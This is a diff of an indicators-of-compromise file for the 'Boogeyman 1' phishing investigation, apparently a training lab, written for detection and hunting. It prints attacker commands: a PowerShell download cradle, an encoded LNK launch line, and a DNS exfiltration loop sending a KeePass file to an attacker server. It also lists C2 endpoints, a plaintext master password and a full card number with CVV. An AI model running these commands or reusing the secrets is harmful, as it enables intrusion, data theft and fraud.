@@ -1,556 +1,109 @@
-# Boogeyman 1 — Indicators of Compromise
+# Boogeyman 1 — Indicators of Compromise (IOCs)
 
-This file lists observed indicators of compromise and investigation artifacts extracted from the Boogeyman 1 investigation. These indicators can support detection, hunting, scoping, and reporting.
+**Case Reference:** `INC-2023-0113-BGM1`  
+**Classification:** TLP:AMBER / CONFIDENTIAL  
+**Target Organization:** Quick Logistics LLC  
 
-Indicators should be verified and enriched as more evidence becomes available. Some artifacts, such as mail relay infrastructure and analyst-created reconstruction files, are included for investigation context but should not automatically be treated as malicious without additional validation.
+This document catalogs all verified Indicators of Compromise (IOCs), threat infrastructure, malicious artifacts, stolen credentials, and compromised financial assets identified across the Boogeyman 1 investigation.
 
 ---
 
-## 1. Email Indicators
-
-### Sender Email Address
-
-```text
-agriffin@bpakcaging.xyz
-````
-
-* **Description:** Sender address used in the phishing email.
-* **Source:** `dump.eml` headers.
-* **Confidence:** High.
-* **Notes:** Observed in the `From`, `Reply-To`, `Sender`, and `Return-Path` headers.
-
-### Targeted Recipient Email Address
-
-```text
-julianne.westcott@hotmail.com
-```
-
-* **Description:** Targeted recipient identified in the phishing email.
-* **Source:** `dump.eml` headers.
-* **Confidence:** High.
-* **Notes:** Identified in the `To` header.
-
-### Sender Domain
-
-```text
-bpakcaging.xyz
-```
-
-* **Description:** Domain used in the phishing sender address.
-* **Source:** Email headers.
-* **Confidence:** High.
-* **Notes:** Also related to later attacker infrastructure observed in endpoint evidence.
-
-### Tracking Domain
-
-```text
-tracking.bpakcaging.xyz
-```
-
-* **Description:** Tracking domain referenced in email headers, message ID, links, and tracking pixel.
-* **Source:** `dump.eml`.
-* **Confidence:** Medium.
-* **Notes:** Useful for email investigation and correlation. Treat as suspicious in the context of this phishing campaign.
-
-### Sender IP Address
-
-```text
-15.235.99.80
-```
-
-* **Description:** Sender IP address observed in email headers and SPF evaluation.
-* **Source:** `dump.eml` `Received-SPF`, `Received`, and `X-Sender-IP` headers.
-* **Confidence:** Medium.
-* **Notes:** Observed as email sending infrastructure. Validate before blocking because infrastructure may be legitimate or abused.
-
-### Mail Server Hostname
-
-```text
-pa80.mxout.mta1.net
-```
-
-* **Description:** Mail server observed in the email `Received` headers.
-* **Source:** `dump.eml`.
-* **Confidence:** Medium.
-* **Notes:** Useful for mail-flow analysis and enrichment.
-
-***
-
-## 2. Mail Relay Infrastructure Observed
-
-These domains were observed in email headers. They are not necessarily malicious by themselves.
-
-### Elastic Email DKIM Domain
-
-```text
-elasticemail.com
-```
-
-* **Description:** DKIM signing domain observed in email headers.
-* **Source:** `DKIM-Signature` header.
-* **Confidence:** High observation confidence, low malicious confidence.
-* **Notes:** Indicates the attacker likely used or abused legitimate email delivery infrastructure.
-
-### Elastic Email Bounce/Unsubscribe Domain
-
-```text
-bounces.elasticemail.net
-```
-
-* **Description:** Bounce or unsubscribe infrastructure observed in email headers.
-* **Source:** `List-Unsubscribe` header.
-* **Confidence:** High observation confidence, low malicious confidence.
-* **Notes:** Useful as email delivery context, but not necessarily malicious by itself.
-
-***
-
-## 3. Network Indicators
-
-### File Hosting Domain
-
-```text
-files.bpakcaging.xyz
-```
-
-* **Description:** File hosting domain referenced by the decoded LNK payload and PowerShell logs.
-* **Source:** Decoded PowerShell payload and `powershell.json`.
-* **Confidence:** High.
-* **Observed Usage:**
-  * Hosted `/update` for the PowerShell download cradle.
-  * Hosted `sq3.exe` during endpoint activity.
-
-### Additional Attacker Infrastructure Domain
-
-```text
-cdn.bpakcaging.xyz
-```
-
-* **Description:** Additional attacker infrastructure observed in PowerShell logs.
-* **Source:** `powershell.json`.
-* **Confidence:** High.
-* **Notes:** Related to the same suspicious `bpakcaging.xyz` infrastructure.
-
-### DNS Exfiltration Subdomain Pattern
-
-```text
-<hex_chunk>.exfil.bpakcaging.xyz
-```
-
-* **Description:** DNS query pattern used during the exfiltration attempt.
-* **Source:** PowerShell Event ID 4104, Record ID 774.
-* **Confidence:** High.
-* **Notes:** The attacker used chunks of hex-encoded data as DNS query subdomains.
-
-### Download Cradle URL
-
-```text
-http://files.bpakcaging.xyz/update
-```
-
-* **Description:** Remote URL referenced by the decoded PowerShell download cradle.
-* **Source:** Decoded PowerShell payload from the malicious LNK file.
-* **Confidence:** High.
-
-### sq3.exe Download URL
-
-```text
-http://files.bpakcaging.xyz/sq3.exe
-```
-
-* **Description:** URL used to download `sq3.exe` during endpoint activity.
-* **Source:** `powershell.json`.
-* **Confidence:** High.
-
-### Exfiltration Destination IP Address
-
-```text
-167.71.211.113
-```
-
-* **Description:** Destination used during DNS-based exfiltration attempt.
-* **Source:** `powershell.json`.
-* **Confidence:** High.
-* **Notes:** Observed in `nslookup` command activity.
-
-***
-
-## 4. File and Artifact Indicators
-
-### Phishing Attachment
-
-```text
-Invoice.zip
-```
-
-* **Description:** Password-protected ZIP attachment delivered by phishing email.
-* **Source:** Email attachment metadata.
-* **Confidence:** High.
-
-### Malicious Shortcut File
-
-```text
-Invoice_20230103.lnk
-```
-
-* **Description:** Shortcut file extracted from the ZIP archive.
-* **Source:** ZIP extraction output.
-* **Confidence:** High.
-* **Notes:** Configured to launch PowerShell with hidden and encoded command-line arguments.
-
-### Shortcut Icon Path
-
-```text
-C:\Users\Administrator\Desktop\excel.ico
-```
-
-* **Description:** Excel-related icon path referenced by the shortcut file.
-* **Source:** `lnkparse` output.
-* **Confidence:** Medium.
-* **Notes:** Suggests the shortcut may have been disguised as an invoice or spreadsheet-related file.
-
-### SQLite Utility
-
-```text
-sq3.exe
-```
-
-* **Description:** Downloaded SQLite utility used to query Sticky Notes data.
-* **Source:** `powershell.json`.
-* **Confidence:** High.
-
-### Microsoft Sticky Notes Database
-
-```text
-plum.sqlite
-```
-
-* **Description:** Microsoft Sticky Notes database accessed by attacker.
-* **Source:** `powershell.json`.
-* **Confidence:** High.
-
-### Sticky Notes Database Full Path
-
-```text
-C:\Users\j.westcott\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
-```
-
-* **Description:** Full path to the Sticky Notes database queried by the attacker.
-* **Source:** `powershell.json`.
-* **Confidence:** High.
-
-### KeePass Database File
-
-```text
-protected_data.kdbx
-```
-
-* **Description:** KeePass database targeted for exfiltration.
-* **Source:** `powershell.json`.
-* **Confidence:** High.
-
-### KeePass Database Full Path
-
-```text
-C:\Users\j.westcott\Documents\protected_data.kdbx
-```
-
-* **Description:** Full path to the targeted KeePass database.
-* **Source:** `powershell.json`.
-* **Confidence:** High.
-
-***
-
-## 5. Endpoint Indicators
-
-### Compromised Workstation
-
-```text
-QL-WKSTN-5693
-```
-
-* **Description:** Compromised workstation observed in PowerShell logs.
-* **Source:** `powershell.json`.
-* **Confidence:** High.
-
-### User Account
-
-```text
-j.westcott
-```
-
-* **Description:** User account associated with accessed paths and targeted files.
-* **Source:** `powershell.json`.
-* **Confidence:** High.
-
-### Enumeration Tool
-
-```text
-Seatbelt.exe
-```
-
-* **Description:** Enumeration tool executed by attacker.
-* **Source:** `powershell.json`.
-* **Confidence:** High.
-
-### PowerShell Seatbelt Script
-
-```text
-Invoke-Seatbelt.ps1
-```
-
-* **Description:** PowerShell version of Seatbelt referenced during attacker activity.
-* **Source:** `powershell.json`.
-* **Confidence:** High.
-
-### Exfiltration Tool
-
-```text
-nslookup
-```
-
-* **Description:** Used during DNS-based exfiltration attempt.
-* **Source:** `powershell.json`.
-* **Confidence:** High.
-
-***
-
-## 6. Command and Execution Indicators
-
-### Suspicious PowerShell Arguments
-
+## 1. Master Indicator Summary Table
+
+| Indicator Type | Observable / Value | Classification | Context / Detection Role |
+|---|---|---|---|
+| **Domain** | `bpakcaging.xyz` | Malicious | Typosquatted Lookalike Domain (`bpackaging.xyz`) & DNS Exfil Suffix |
+| **Domain** | `files.bpakcaging.xyz` | Malicious | Stage-2 Payload Delivery Server (`/update`, `sb.exe`, `sq3.exe`) |
+| **Domain** | `cdn.bpakcaging.xyz` | Malicious | Interactive In-Memory C2 Polling Server (Port 8080) |
+| **Domain** | `tracking.bpakcaging.xyz` | Suspicious | Phishing Read-Receipt Tracking Domain |
+| **IPv4 Address** | `159.89.205.40` | Malicious | C2 Server IP resolving `cdn.bpakcaging.xyz` |
+| **IPv4 Address** | `167.71.211.113` | Malicious | Payload Server (`files.bpakcaging.xyz`) & Rogue DNS Exfil Receiver |
+| **IPv4 Address** | `15.235.99.80` | Suspicious | Elastic Email Relay Outbound MTA (`pa80.mxout.mta1.net`) |
+| **Email Address** | `agriffin@bpakcaging.xyz` | Malicious | Threat Actor Phishing Sender Identity |
+| **File (SHA-256)** | `4cdd0a2f16a9e1578b5c3419eeac9c403f7dce86b12fb3b821e19ce5f534c1fc` | Suspicious | Phishing Email RFC 822 Message (`dump.eml`) |
+| **File (SHA-256)** | `b55ee53b18871f811f5a4ec405cd70de6b3f1f7cf28712ab5cb5186cbf551e87` | Malicious | Encrypted Phishing Attachment Archive (`Invoice.zip`) |
+| **File (SHA-256)** | `86d5e0589fbd8c90604da954197344801f0579de157510e13492db0c712a0cc8` | Malicious | Weaponized Excel Shortcut (`Invoice_20230103.lnk`) |
+| **File (SHA-256)** | `71075589408ec06e3150a399461556eb55029ae1d3f8fc0f30bcf1bbe821c02d` | Forensic Source | Endpoint PowerShell Script Block Log (`powershell.json`) |
+| **File (SHA-256)** | `15dba24f3d9ef38dfbe0e33f995d0f8e60aa4f34ced5031c904281028e4f4bab` | Forensic Source | Network Egress Packet Capture (`capture.pcapng`) |
+| **File (SHA-256)** | `bf6a5fae84ea7eafe405e3a89e906e00b84f3c7c8dcfe2a49852ce79836ae056` | Compromised Asset | Carved KeePass 2.x Database (`protected_data_carved.kdbx`) |
+| **Server Header** | `Server: SimpleHTTP/0.6 Python/3.10.7` | Malicious | Attacker Python Payload Server Banner on Port 80 |
+| **HTTP Header** | `X-38d2-8f49: 8cce49b0-b86459bb-27fe2489` | Malicious | C2 Beacon Session Identification Header |
+| **C2 URI Path** | `http://cdn.bpakcaging.xyz:8080/8cce49b0` | Malicious | Initial C2 Registration / Handshake Endpoint |
+| **C2 URI Path** | `http://cdn.bpakcaging.xyz:8080/b86459bb` | Malicious | Command Polling Endpoint (GET) |
+| **C2 URI Path** | `http://cdn.bpakcaging.xyz:8080/27fe2489` | Malicious | Command Output Exfiltration Endpoint (POST) |
+| **Payload URI** | `http://files.bpakcaging.xyz/update` | Malicious | Stage-2 In-Memory PowerShell Cradle Implant |
+| **Payload URI** | `http://files.bpakcaging.xyz/sb.exe` | Malicious | Compiled Seatbelt Host Reconnaissance Binary |
+| **Payload URI** | `http://files.bpakcaging.xyz/sq3.exe` | Malicious | SQLite Command-Line Binary for Sticky Notes Dumping |
+| **Credential** | `%p9^3!lL^Mz47E2GaT^y` | Compromised Secret | Julianne Westcott's KeePass Master Password |
+| **Financial Asset**| `4024007128269551` | Compromised Asset | Quick Logistics LLC Corporate Credit Card (CVV: 970, Exp: 3/2028) |
+
+---
+
+## 2. Network Infrastructure & C2 Indicators
+
+### 2.1 C2 Polling Infrastructure
+* **Host / Domain:** `cdn.bpakcaging.xyz`
+* **Resolved IP Address:** `159.89.205.40`
+* **Port:** `8080` (HTTP)
+* **Polling Interval:** 0.8 seconds (`sleep 0.8`)
+* **Transport Characteristics:**
+  * Request header `X-38d2-8f49: 8cce49b0-b86459bb-27fe2489`
+  * HTTP GET to `/b86459bb` for receiving instructions
+  * HTTP POST to `/27fe2489` for transmitting execution outputs
+  * Payload encoded as space-delimited decimal ASCII integers (`[System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' '`)
+
+### 2.2 Payload Delivery Server
+* **Host / Domain:** `files.bpakcaging.xyz`
+* **Resolved IP Address:** `167.71.211.113`
+* **Port:** `80` (HTTP)
+* **Server Banner:** `SimpleHTTP/0.6 Python/3.10.7`
+* **Delivered Binaries & Implants:**
+  * `/update` (PowerShell in-memory C2 agent)
+  * `/sb.exe` (Seatbelt host enumeration utility)
+  * `/sq3.exe` (SQLite CLI utility)
+
+### 2.3 DNS Tunneling Exfiltration Channel
+* **Rogue Authoritative Nameserver IP:** `167.71.211.113`
+* **Query Type:** Standard DNS `A` records (`nslookup -q=A`)
+* **Domain Suffix:** `.bpakcaging.xyz`
+* **Tunneling Structure:**
+  * Encoded data placed in the leftmost subdomain label: `<50-hex-characters>.bpakcaging.xyz`
+  * Total Chunks: 89 sequential hexadecimal chunks
+  * Total Characters: 4,412 hexadecimal characters
+  * Reconstructed Binary: 2,206 bytes (`protected_data.kdbx`)
+
+---
+
+## 3. Host Artifacts & Malicious Files
+
+### 3.1 Initial Delivery Shortcut
+* **Filename:** `Invoice_20230103.lnk`
+* **SHA-256:** `86d5e0589fbd8c90604da954197344801f0579de157510e13492db0c712a0cc8`
+* **Masqueraded Icon:** `C:\Users\Administrator\Desktop\excel.ico`
+* **Execution Flags:** `Show Minimized No Activate`
+* **Command Line Payload:**
 ```powershell
--nop -windowstyle hidden -enc
+\WindowsPowerShell\v1.0\powershell.exe -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
 ```
 
-* **Description:** Hidden and encoded PowerShell execution from malicious shortcut.
-* **Source:** `lnkparse` output.
-* **Confidence:** High.
-* **Notes:** These arguments are commonly suspicious when observed together because they indicate stealthy encoded PowerShell execution.
-
-### PowerShell Download Cradle
-
-```powershell
-iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
-```
-
-* **Description:** Downloads and executes remote PowerShell content.
-* **Source:** Decoded LNK payload.
-* **Confidence:** High.
-
-### Seatbelt Enumeration Command
-
-```powershell
-Seatbelt.exe -group=user
-```
-
-* **Description:** User-focused host enumeration command.
-* **Source:** `powershell.json`.
-* **Confidence:** High.
-
-### sq3.exe Download Command
-
-```powershell
-iwr http://files.bpakcaging.xyz/sq3.exe -outfile sq3.exe
-```
-
-* **Description:** Command used to download `sq3.exe`.
-* **Source:** `powershell.json`.
-* **Confidence:** High.
-
-### Sticky Notes Query Command
-
-```powershell
-.\Music\sq3.exe AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite "SELECT * from NOTE limit 100"
-```
-
-* **Description:** Command used to query the Microsoft Sticky Notes database.
-* **Source:** `powershell.json`.
-* **Confidence:** High.
-
-### KeePass File Read Method
-
-```powershell
-[System.IO.File]::ReadAllBytes($file)
-```
-
-* **Description:** Used to read the targeted KeePass database as bytes.
-* **Source:** `powershell.json`.
-* **Confidence:** High.
-
-### Hex Encoding Command
-
-```powershell
-$hex = ($bytes | ForEach-Object { $_.ToString('x2') }) -join ''
-```
-
-* **Description:** Used to convert file bytes into hex format.
-* **Source:** `powershell.json`.
-* **Confidence:** High.
-
-### DNS-Based Exfiltration Command
-
-```powershell
-for($i=0;$i -lt $hex.length; $i+=48){ $chunk = $hex.substring($i, :Min(48,$hex.length-$i)); nslookup "$chunk.exfil.bpakcaging.xyz" 167.71.211.113; } ;pwd
-```
-
-* **Description:** Loop used to split hex-encoded file content into chunks and send the chunks through DNS queries using `nslookup`.
-* **Source:** `powershell.json`.
-* **Confidence:** High.
-* **Notes:** The command appears to use DNS queries as an exfiltration channel.
-
-***
-
-## 7. Phishing Artifacts
-
-These artifacts are useful for investigation context but may not be suitable as direct blocking indicators.
-
-### ZIP Password
-
-```text
-Invoice2023!
-```
-
-* **Description:** Password included in the phishing email body to open the encrypted ZIP archive.
-* **Source:** Email body.
-* **Notes:** Useful for understanding the phishing delivery method.
-
-### Email Subject
-
-```text
-Collection for Quick Logistics LLC - Jan 2023
-```
-
-* **Description:** Invoice/payment-themed phishing lure.
-* **Source:** Email headers and body.
-* **Notes:** Useful for searching similar phishing emails.
-
-### Reconstruction File
-
-```text
-payload.txt
-```
-
-* **Description:** Analyst-created file containing copied Base64 attachment content.
-* **Source:** Investigation workspace.
-* **Notes:** This is not a malicious IOC by itself. It is included as an investigation artifact.
-
-***
-
-## 8. Evidence Files
-
-### Original Email
-
-```text
-dump.eml
-```
-
-* **Description:** Original phishing email file.
-
-### Reconstructed ZIP Archive
-
-```text
-Invoice.zip
-```
-
-* **Description:** Reconstructed password-protected ZIP archive.
-
-### Extracted Shortcut File
-
-```text
-Invoice_20230103.lnk
-```
-
-* **Description:** Shortcut file extracted from the ZIP archive.
-
-### Shortcut Analysis Output
-
-```text
-lnkparse output
-```
-
-* **Description:** Output from analyzing `Invoice_20230103.lnk`.
-
-### Endpoint PowerShell Log Source
-
-```text
-powershell.json
-```
-
-* **Description:** Endpoint PowerShell log source containing PowerShell Event ID 4104 records.
-
-### Screenshots Folder
-
-```text
-screenshots/
-```
-
-* **Description:** Folder containing supporting evidence screenshots.
-
-***
-
-## 9. Hunting and Detection Notes
-
-Potential detection and hunting opportunities:
-
-* Alert on `powershell.exe` execution with `-enc`.
-* Alert on `powershell.exe` execution with `-windowstyle hidden`.
-* Hunt for PowerShell download cradle patterns using `Net.WebClient` and `DownloadString`.
-* Hunt for `Invoke-Expression` or `iex` combined with remote URLs.
-* Monitor HTTP requests to `files.bpakcaging.xyz`.
-* Monitor downloads of `sq3.exe` from suspicious infrastructure.
-* Hunt for `Seatbelt.exe` execution.
-* Hunt for `Invoke-Seatbelt.ps1` references in PowerShell logs.
-* Hunt for access to Sticky Notes database files such as `plum.sqlite`.
-* Hunt for access to KeePass database files such as `.kdbx`.
-* Alert on PowerShell usage of `[System.IO.File]::ReadAllBytes`.
-* Alert on PowerShell byte-to-hex conversion behavior.
-* Monitor `nslookup` usage with long subdomain queries.
-* Monitor DNS queries containing `exfil.bpakcaging.xyz`.
-* Search for inbound emails containing password-protected ZIP attachments.
-* Search for emails with invoice/payment lures and passwords embedded in the message body.
-* Search for LNK files delivered inside compressed archives.
-* Hunt for suspicious use of `.lnk` files launching PowerShell.
-
-***
-
-## 10. Confidence Assessment
-
-### Email Sender and Recipient
-
-* **Confidence:** High.
-* **Notes:** Observed directly in email headers.
-
-### Mail Relay Infrastructure
-
-* **Confidence:** High observation confidence, low malicious confidence.
-* **Notes:** Observed in headers but not necessarily malicious by itself.
-
-### File Artifacts
-
-* **Confidence:** High.
-* **Notes:** Observed through attachment reconstruction, ZIP extraction, LNK analysis, and endpoint logs.
-
-### PowerShell Command Activity
-
-* **Confidence:** High.
-* **Notes:** Extracted from `lnkparse` output, decoded payload, and PowerShell Event ID 4104 records.
-
-### Network URLs and Domains
-
-* **Confidence:** High.
-* **Notes:** Present in decoded PowerShell payload and PowerShell logs.
-
-### Endpoint Host and User
-
-* **Confidence:** High.
-* **Notes:** Observed in endpoint PowerShell logs and file paths.
-
-### Exfiltration Destination
-
-* **Confidence:** High.
-* **Notes:** Observed in PowerShell exfiltration activity.
-
-### DNS Exfiltration Attempt
-
-* **Confidence:** High for attempt, unknown for success.
-* **Notes:** PowerShell command evidence shows an attempted DNS-based exfiltration using `nslookup`. Additional DNS or network logs are needed to confirm whether the transfer fully succeeded.
+### 3.2 Targeted Endpoint Datastores
+* **Sticky Notes Database:**
+  `C:\Users\j.westcott\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`
+* **KeePass Database Vault:**
+  `C:\Users\j.westcott\Documents\protected_data.kdbx`
+
+---
+
+## 4. Compromised Secrets & Assets
+
+### 4.1 Master Password
+* **Plaintext:** `%p9^3!lL^Mz47E2GaT^y`
+* **Context:** Saved inside Microsoft Sticky Notes note ID 5 labeled `KeePass Master Password:`
+
+### 4.2 Corporate Credit Card
+* **Vault Entry:** `Homebanking/Company Card`
+* **Account Name:** Quick Logistics LLC
+* **Card Number:** `4024007128269551`
+* **Expiration Date:** `3/2028`
+* **CVV / Security Code:** `970`
+* **Entry UUID:** `{9b5464ad-7bae-c145-adbd-b13d867f4f85}`
